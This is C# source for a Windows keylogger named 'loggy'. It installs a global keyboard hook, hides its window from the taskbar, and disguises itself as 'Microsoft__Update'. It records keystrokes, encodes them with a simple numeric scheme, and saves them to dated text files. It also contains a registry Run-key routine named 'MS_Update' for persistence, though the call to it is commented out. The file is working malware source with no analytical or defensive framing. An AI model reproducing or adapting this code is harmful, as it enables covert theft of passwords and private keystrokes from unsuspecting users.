using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using HookApp;
using Microsoft.Win32;

namespace loggy
{
	public partial class Microsoft__Update : Form
	{
		Y2KeyboardHook _keyboardHook;
		public Microsoft__Update()
		{
			InitializeComponent();

            this.FormBorderStyle = FormBorderStyle.None;
            this.ShowInTaskbar = false;
            
            string log = "";

            
            _keyboardHook = new Y2KeyboardHook();
			_keyboardHook.Install();

            int count_space = 0;

			_keyboardHook.KeyDown += (sender, e) =>
			{
				if (e.KeyCode == Keys.Space)
				{
					log += " ";
                    count_space++;
				}
                //if (e.KeyCode == Keys.Back)
                //{
                //    log += "[back]";
                //}
                if (e.KeyCode == Keys.Delete)
                {
                    log += "[del]";
                }
                //if (e.KeyCode == Keys.LShiftKey)
                //{
                //    log += "[shift]";
                //}
                if (e.KeyCode == Keys.Oemcomma)
                {
                    log += ",";
                }
                if (e.KeyCode == Keys.OemPeriod)
                {
                    log += ".";
                }
                if (e.KeyCode == Keys.LShiftKey)
                {
                    _keyboardHook.KeyDown += (sender1, e1) =>
                    {
                        if (e1.KeyCode == Keys.D2)
                        {
                            log += "@";
                        }
                    };
                }
                if ((int)e.KeyCode > 47 && (int)e.KeyCode < 90)
				{
					//log += e.KeyCode.ToString();
					log += (new KeysConverter()).ConvertToString(e.KeyCode);
				}


                if (count_space == 3)
                {
                    Save_log(log);
                    //Save_log_no_encrpyt(log);
                    log = "";
                    count_space = 0;
                }
                //Save_log(Encrypt(log));
            };
		}
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
                return cp;
            }
        }
        public void Save_log(string text)
		{
           // string date = DateTime.Now.ToString("dd.MM HH:mm:ss tt");
            string date2 = DateTime.Now.ToString("dd.MM");
            string path = date2;
            #region create folder 
            bool exists = Directory.Exists(path);
            if (!exists)
                Directory.CreateDirectory(path);
            if (!File.Exists(path))
            {
                //File.Create(path);
                StreamWriter sw = File.CreateText(path + @"\" + date2 + ".txt");
                sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
                sw.Close();
            }
            #endregion

            //using (StreamWriter sw = new StreamWriter(@"C:\SystemLog", true))
            //using (StreamWriter sw = new StreamWriter(@"a.txt", true)) 
            //{
            //    sw.WriteLine(Encrypt(DateTime.Now.ToString() + " " + text));
            //}
        }
        public void Save_log_no_encrpyt(string text)
        {
            using (StreamWriter sw = new StreamWriter(@"C:\SystemLog_NO", true))
            {
                sw.WriteLine((DateTime.Now.ToString() + " " + text));
            }
        }
        public string Encrypt(string text)
        {
            string Encpt = "";
            string s = text;
            foreach (char c in s)
            {
                int m = Convert.ToInt32(c);
                if (m < 10)
                    Encpt += 0.ToString() + 0.ToString() + m; // + " ";
                if (m > 9 && m < 100)
                    Encpt += 0.ToString() + m;// + " ";
                else
                    Encpt += m;// + " ";
            }
            return Encpt;
        }
     
        private void Microsoft__Update_Load(object sender, EventArgs e)
        {
            //Add_Registry();
        }

        private void Add_Registry()
        {
            RegistryKey rk1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string a = (string)rk1.GetValue("MS_Update");
            if (a == null)
            {
                rk1.SetValue("MS_Update", "\"" + Application.ExecutablePath.ToString() + "\"");
            }
            else
            {
                //MessageBox.Show("đã add");
            }
        }
    }
}
